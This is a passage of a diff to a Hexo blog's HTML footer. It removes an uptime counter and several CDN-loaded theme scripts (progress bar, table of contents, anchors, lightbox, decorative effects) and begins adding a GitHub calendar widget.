-      if(String(mnum).length ==1 ){
-                mnum = "0" + mnum;
-      }
-      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-      snum = Math.round(seconds);
-      if(String(snum).length ==1 ){
-                snum = "0" + snum;
-      }
-      document.getElementById("timeDate").innerHTML = "🚀running🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
-      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
-  }  //此次自定义显示内容
-  setInterval("createtime()",250);
-  </script>   
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-<!-- hexo injector body_end start -->
+    <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
